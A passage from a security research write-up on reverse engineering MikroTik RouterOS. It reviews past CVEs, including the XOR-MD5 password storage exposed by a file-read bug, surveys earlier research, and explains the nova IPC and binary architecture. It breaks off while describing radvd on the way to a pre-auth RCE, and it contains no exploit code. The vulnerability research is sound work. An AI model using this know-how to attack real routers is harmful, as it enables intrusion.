  &lt;li&gt;CVE-2018-14847: Also the one of the leaked vulnerabilities from the â€œVault 7â€, which could allow an attacker to achieve arbitrary file read. Which doesnâ€™t sound like a big problem, but because in the earlier version of RouterOS, the userâ€™s password was stored in a file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password xor md5(username + &quot;283i4jfkai3389&quot;)&lt;/code&gt;, the attacker can calculate the password of admin as long as the attacker can read the file.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;CVE-2021-41987&lt;/a&gt;ï¼šA heap buffer overflow vulnerability in the base64 decoding process of the SCEP service due to a length miscalculation. The vulnerability was discovered after security researchers analyzed an APTâ€™s exploit on its C2 server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As we can see, most of these vulnerabilities are â€œin the wild.â€ We can only learn limited knowledge about analyzing and reversing the RouterOS.&lt;/p&gt;

&lt;h2 id=&quot;review-of-related-research&quot;&gt;Review of Related Research&lt;/h2&gt;

&lt;p&gt;We continue to seek out publicly available research materials, and we have these articles and presentations available at the time of the competition:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-08-06_prez_SHA_MT_pub.pdf&quot;&gt;Kirils. Rooting the MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf&quot;&gt;Kirils. A deeper journey into MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-10-21_MT_Hacktivity_pub.pdf&quot;&gt;Kirils. Tools for effortless reverse engineering of MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2018
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/tenable/routeros&quot;&gt;Jacob Baines. Bug Hunting in RouterOS&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Explaining how nova message works in IPC&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2019
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6&quot;&gt;Jacob Baines. Make It Rain with MikroTik&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Identical to the talk in 2018&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24&quot;&gt;Jacob Baines. MikroTik Firewall &amp;amp; NAT Bypass&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;A vulnerability in WinBox: it can be used to scan the intranet once itâ€™s exposed to the WAN&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;Maximiliano Vidal, Juan Caillava. Finding and exploiting CVE-2018â€“7445&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found buffer overflow in SMB by black-box fuzzing and how to exploit the vulnerability to get shell&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://mum.mikrotik.com/presentations/ID18/presentation_6149_1540240927.pdf&quot;&gt;Tomas Kirnak. Deep-dive: MikroTik exploits - a security analysis&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Discussing the mass exploit event after the leakage of CIAâ€™s â€œVault7â€ arsenal&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Jacob-Baines-Help-Me-Vulnerabilities.-Youre-My-Only-Hope.pdf&quot;&gt;Jacob Baines. Help Me Vulnerabilities Youâ€™re My Only Hope&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Release a tool for jailbreaking RouterOS to help user to check if their router has been compromised in the mass exploit event&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21&quot;&gt;Jacob Baines. RouterOS: Chain to Root&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Get shell by chaining DNS poisoning and downgrade vulnerabilities&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2022
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;D39. Vulnerability Exposure &amp;amp; Notification on Mikrotik (CVE-2021-41987)&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found an exploit contains 0-day that targets RouterOS on an APTâ€™s C2 server&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Detail the IPC mechanism of the RouterOS and release a jailbreak tool â€œFOIStedâ€ to help researchers do further research on the amd64 version of RouterOS.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://powerofcommunity.net/poc2022/QianChen.pdf&quot;&gt;Qian Chen. MikroTik RouterOS Security: The Forgotten IPC Message&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found several vulnerabilities in IPC by fuzzing&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;review-of-the-ipc-and-the-nova-message&quot;&gt;Review of the IPC and the Nova Message&lt;/h2&gt;

&lt;p&gt;Most of the research centers around RouterOSâ€™s homebrew IPC, so we also took some time to review it. Here is a simple example to explain the main idea of the IPC.&lt;/p&gt;

&lt;p&gt;Normally, a user can log in to the RouterOS through telnet, and manage the router by console.
&lt;img src=&quot;/assets/img/blog/20240524/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Letâ€™s follow the procedure step by step:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;When the user tries to access the console of RouterOS through the telnet. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; process will spawn the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execl&lt;/code&gt;, which asks the user for account and password.
&lt;img src=&quot;/assets/img/blog/20240524/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;After getting the account and password, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; would pack that info into a nova message, and send it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process for authentication.
&lt;img src=&quot;/assets/img/blog/20240524/7.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process returns the result by sending back a nova message
&lt;img src=&quot;/assets/img/blog/20240524/8.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;If the login succeeds, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; process is spawned, and the user interaction with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; is actually proxied through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ipc&quot;&gt;IPC&lt;/h3&gt;

&lt;p&gt;The above example simply describes the basic concept of IPC, but the communication between the two processes is actually more complex.&lt;/p&gt;

&lt;p&gt;Every nova message would be sent to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; process through the socket first, then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; dispatches each nova message to the corresponding nova binary.&lt;/p&gt;

&lt;p&gt;Suppose the id of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process is 1039, the id of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process is 13, and the handler with id 4 in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process is responsible for verifying the account and password.&lt;/p&gt;

&lt;p&gt;Firstly, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process sends a request with an account and password to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; in nova message is an array with two elements &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;13, 4&lt;/code&gt;, which means that the message should be sent to the handler with id 4 in the process with binary id 13.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; receives the message, it will remove the 13 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; of the message which represents the target binary id, and add the source binary id in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt;, which is 1039, and then send the message to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process does a similar thing when it receives a message: removing the 4 from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; that represents the target handler id and sending the nova message to handler 4 for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-message&quot;&gt;Nova Message&lt;/h3&gt;

&lt;p&gt;The nova message used in IPC is initialized and set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::message&lt;/code&gt; and related functions. Nova message is composed of typed key-value pairs, and the key can only be an integer, so keys such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; are just simple macros.&lt;/p&gt;

&lt;p&gt;The types that can be used in a nova message include u32, u64, bool, string, bytes, IP and nova message (i.e. you can create a nested nova message).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because the RouterOS doesnâ€™t use nova messages in JSON anymore, we only focus on the binary format of it.&lt;/p&gt;

&lt;p&gt;During IPC communication, the receiverâ€™s socket receives an integer that expresses the length of the current nova message, followed by the nova message in binary format.
&lt;img src=&quot;/assets/img/blog/20240524/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The nova message starts with two magic bytes: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M2&lt;/code&gt;. Next, each key is described by 4 bytes; the first 3 bytes are used to express the id of the key, and the last byte is the type of the key. Depending on the type, the next bytes will be parsed differently as data, and the next key will come after data, and so on. A special feature is that a bool can be represented by only one bit, so the lowest bit of the type is used to represent True/False. For a more detailed format, see &lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-x3-format&quot;&gt;The x3 format&lt;/h3&gt;

&lt;p&gt;In order to understand which nova binary the ids in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; in the nova message refer to, we need to parse a file with the extension x3, which is an xml in binary format. By parsing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/etc/loader/system.x3&lt;/code&gt; with the tool, we can map which nova binary each id corresponds to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The id of some binaries are absent in this file, because some of them have been made available by installing an official RouterOS package. In which case the binaryâ€™s id will exist in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ram/pckg/&amp;lt;package_name&amp;gt;/nova/etc/loader/&amp;lt;package_name&amp;gt;.x3&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is an example.
&lt;img src=&quot;/assets/img/blog/20240524/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there are still some id of binaries that cannot be found in any .x3 files because these types of processes are not persistent, e.g., the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process, which is only spawned when the user tries to log in and uses a serial number as its id.&lt;/p&gt;

&lt;p&gt;The .x3 file is also used to record nova binary related settings, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; specifies in .x3 which servlet should be used for each URI.
&lt;img src=&quot;/assets/img/blog/20240524/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;After reviewing the research and CVEs from the past, we can see that most vulnerabilities we are interested in have been concentrated in the past, and it seems to be difficult to find  pre-auth vulnerabilities on the WAN side of RouterOS nowadays.&lt;/p&gt;

&lt;p&gt;While vulnerabilities continue to be revealed, the RouterOS is becoming more and more secure. Is it true that there are no more pre-auth vulnerabilities on the RouterOS? Or maybe itâ€™s just that everyone is missing something?&lt;/p&gt;

&lt;p&gt;Most of the public research mentioned earlier falls into the following three categories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Jailbreaking&lt;/li&gt;
  &lt;li&gt;The analysis of the exploits in the wild&lt;/li&gt;
  &lt;li&gt;The nova message in the IPC&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, after reversing the binary on RouterOS for a while, we realized that the complexity of the whole system was more than that, but no one mentioned the details. This led to the following thought: â€œNo one with sanity would like to dive into the details of nova binaryâ€.&lt;/p&gt;

&lt;p&gt;Aside from the exploits leaked from the CIA and APT, most of the research about finding vulnerabilities in RouterOS are: fuzzing network protocols, playing with nova messages, or performing fuzzing tests on nova messages.&lt;/p&gt;

&lt;p&gt;By the outcome, it seems that attackers understand the RouterOS much better than we do, and we need to explore more details about the nova binary to fill in the gaps and increase the possibility to find the vulnerabilities we are looking for. Donâ€™t get me wrong. I donâ€™t against fuzzing. But we must ensure we check everything essential to take advantage of the contest.&lt;/p&gt;

&lt;h2 id=&quot;where-to-begin&quot;&gt;Where to begin&lt;/h2&gt;

&lt;p&gt;We donâ€™t think the RouterOS is flawless, there is a gap between researchersâ€™ and attackersâ€™ understanding of RouterOS. So, what are we missing to find pre-auth RCE on RouterOS?&lt;/p&gt;

&lt;p&gt;The first question that comes to mind is â€œwhere is the entry point of IPC and where does it lead?â€ Because most of the functionality triggered by IPC requires login, it is to be expected that sticking to IPC will only lead to more findings in post-auth. IPC is just one part of the main functionality implemented on RouterOS, and we would like to look at the core code of each functionality directly and carefully.&lt;/p&gt;

&lt;p&gt;For example, how do the process that deal with DHCP extract the info needed in a DHCP packet? This information may be stored directly in the process, or may need to be sent to other processes via IPC for further processing.
&lt;img src=&quot;/assets/img/blog/20240524/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-architecture-of-nova-binary&quot;&gt;The Architecture of Nova Binary&lt;/h3&gt;

&lt;p&gt;Hence, we must first understand the architecture of the nova binary. Each nova binary has an instance of the Looper class (or a derivative of it: MultifiberLooper), which is a class for event loop logic. In each iteration, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runTimer&lt;/code&gt; to execute the timer that is expired, and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to check the status of the sockets then process them accordingly.
&lt;img src=&quot;/assets/img/blog/20240524/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looper is responsible for the communication between its nova binary and the loader. Looper first registers a special callback function: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onMsgSock&lt;/code&gt;, which is responsible for dispatching the nova message received from the socket to the corresponding handler in the nova binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-handler-class-and-its-derivatives&quot;&gt;The Handler class and its derivatives&lt;/h3&gt;

&lt;p&gt;When a looper receives a nova message, it will dispatch it to the corresponding handler, e.g., a message with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14, 0]&lt;/code&gt; will be dispatched by the loader to a nova binary with a binary id of 14. By the time the looper in the binary with a binary id of 14 receives it, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0]&lt;/code&gt; left, so the looper will dispatch it to handler 0 for processing. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; in the initial nova message is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14]&lt;/code&gt;, then the looper receives it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt;, and the looper handles this message on its own.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now letâ€™s assume that the Looper receives a nova message that should be handled by handler 1 and dispatches it to handler 1. At this point, handler 1 calls the methods &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::handleCmd&lt;/code&gt; in the vtable of the handler class, which looks for the corresponding function to execute in the vtable based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_CMD&lt;/code&gt; specified in the nova message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdUnknown&lt;/code&gt; in the vtable is often overridden to extend the functionality, but sometimes the developer overrides &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleCmd&lt;/code&gt; instead, depending on the developerâ€™s mood. The handler class is a base class, so  commands related to objects are not implemented.&lt;/p&gt;

&lt;h3 id=&quot;derived-class&quot;&gt;Derived class&lt;/h3&gt;

&lt;p&gt;However, the basic handler class is not the most used one in nova binaries, but rather a derivative of it. Derived classes can be used to store multiple objects of a single type, similar to C++ STL containers.&lt;/p&gt;

&lt;p&gt;For example, when a user creates a DHCP server through the web panel, a nova message with the command â€œadd objectâ€ is sent to handler 0 of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dhcp&lt;/code&gt; process, which then creates a dhcp server object. And the object will be stored in a tree of handler 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The handler 0 here is an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt; is a derived class of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handler&lt;/code&gt;. Since the command is â€œadd objectâ€, it triggers the member function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap::cmdAddObj&lt;/code&gt;, which calls a function at offset 0x7c in handler 0â€™s vtable. And that function is actually the constructor of the object contained in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&lt;/code&gt;. For example, if the developer defines handler 0 to be of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AMap&amp;lt;string&amp;gt;&lt;/code&gt;, then the function at offset 0x7c is the constructor of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;string&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The offset of the constructor of the inner object in the vtable is different for each derived class, and locating the constructor to determine what type of objects are contained in the derived class can be done by reversing their individual &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdAddObj&lt;/code&gt; function.&lt;/p&gt;

&lt;h3 id=&quot;ipc-and-something-other-than-ipc&quot;&gt;IPC, and something other than IPC&lt;/h3&gt;

&lt;p&gt;Some of the functions in RouterOS are not driven by IPC. Take the two layer 2 discovery protocols, CDP and LLDP, implemented in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;discover&lt;/code&gt; program as an example.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;When starting the two services, handler 0 will be responsible for calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::createPacketReceiver&lt;/code&gt; to open the sockets and register the callback functions for CDP and LLDP.&lt;/li&gt;
  &lt;li&gt;In each iteration of the Looper, call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to check if the sockets of CDP and LLDP have received any packets.&lt;/li&gt;
  &lt;li&gt;If packets are received, the corresponding callback function will be called to handle the packets.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What CDPâ€™s callback does is very simple: it makes sure that the interface that received the packet is allowed, and if it is, it parses the packet and stores the information directly into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ASecMap&lt;/code&gt; instead of using a nova message, and then returns.
&lt;img src=&quot;/assets/img/blog/20240524/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It follows that IPC has no ability to trigger any function of CDP or LLDP other than to turn on CDP or LLDP services (which are turned on by default), so it is likely that previous research focused on IPC has not tested the program logic of such implementation.&lt;/p&gt;

&lt;h2 id=&quot;the-story-of-pre-auth-rce&quot;&gt;The Story of Pre-Auth RCE&lt;/h2&gt;

&lt;p&gt;With the knowledge of RouterOS, a surprising accident led us to a long hidden vulnerability.&lt;/p&gt;

&lt;p&gt;One day, when we plugged and unplugged the network cable as usual for reversing and debugging on RouterOS, we found that the log file recorded that the program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; had crashed several times! So we tried plugging and unplugging the cable to manually reproduce the crash so that we could use the debugger to locate the problem, but after thousands of plugs and unplugs, we still couldnâ€™t determine the conditions under which the crash was occurring, and it appeared to be just a random crash.&lt;/p&gt;

&lt;p&gt;After a period of trial and error, we tried to find out where the crash occurred by static reversing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; rather than blindly trying. Though we still couldnâ€™t find the root cause of the crash in the end, we found another vulnerability in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; after reviewing the core logic in binary with the benefit of our understanding of the nova binary.&lt;/p&gt;

&lt;p&gt;Before describing this vulnerability, letâ€™s first explain what the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process does.&lt;/p&gt;

&lt;h3 id=&quot;slaac-stateless-address-auto-configuration-&quot;&gt;SLAAC (Stateless Address Auto-Configuration )&lt;/h3&gt;

&lt;p&gt;In short, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is a service that handles SLAAC for IPv6.&lt;/p&gt;

&lt;p&gt;In a SLAAC environment, suppose a computer wants to get an IPv6 address to access the Internet, it will first broadcast an RS (Router Solicitation) request to all routers. After the router receives the RS, it will broadcast the network prefix through RA (Router Advertisement); computers receiving the RA can take the network prefix then combine it with the EUI-64 to decide what IPv6 address theyâ€™re going to use for connecting to the Internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If an ISP or network administrator wants to assign a network segment to a user, so that the user can assign the address to the user-managed machines. How to assign a segment to the user when only using SLAAC without DHCP? Because SLAAC does not have a way to delegate directly, this is how it usually works:&lt;/p&gt;

&lt;p&gt;Suppose there is an upstream router: Router A, which belongs to an ISP or a network administrator, a user-managed Router B, and a user-managed computer. The ISP or the network administrator will notify the user via email in advance about a /48 network prefix assigned to the user, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2001:db8::/48&lt;/code&gt; in this case. Users can set it on Router B, then when the computer sends RS to Router B, Router B will put this prefix into RA for return, this prefix is called routed prefix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to make Router B be able to communicate with Router A, it also needs to get network prefix from Router A for an IPv6 address of its own. And the network prefix that Router B gets from Router A is called a link prefix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-execution-flow-of-the-radvd&quot;&gt;The execution flow of the radvd&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;When the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; process is started, the socket used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is opened by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::ThinRunner::addSocket&lt;/code&gt; and the corresponding callback function is registered.
&lt;img src=&quot;/assets/img/blog/20240524/29.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;In each iteration of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Looper&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radavd&lt;/code&gt;, the socket is checked by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to see if it has received any packets.
&lt;img src=&quot;/assets/img/blog/20240524/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;If any packets are received, the corresponding callback function will be called to process the packets.
&lt;img src=&quot;/assets/img/blog/20240524/31.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In the callback function of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rardvd&lt;/code&gt;, it will first check if the packet is a legitimate RA or RS, if itâ€™s RA, store the information, if itâ€™s RS, start broadcasting RA in LAN.&lt;/p&gt;

&lt;p&gt;There are total three cases in which the RouterOS broadcasts the network prefix:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Received RS from LAN&lt;/li&gt;
  &lt;li&gt;Received RA from WAN&lt;/li&gt;
  &lt;li&gt;Timed broadcast of RA packets on LAN (default random broadcast after 200~600 seconds)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;But we didnâ€™t find the code thatâ€™s responsible for case 2 in the callback function by statically reversing. At that time we were not sure why, it is actually related to the subscription mechanism in the RouterOS IPC, which we will explain in a later chapter. However, there are two other cases that we can find out directly through static analysis.&lt;/p&gt;

&lt;p&gt;In case 1, when an RS is received from the LAN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendRA&lt;/code&gt; to broadcast the RA packet:
&lt;img src=&quot;/assets/img/blog/20240524/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

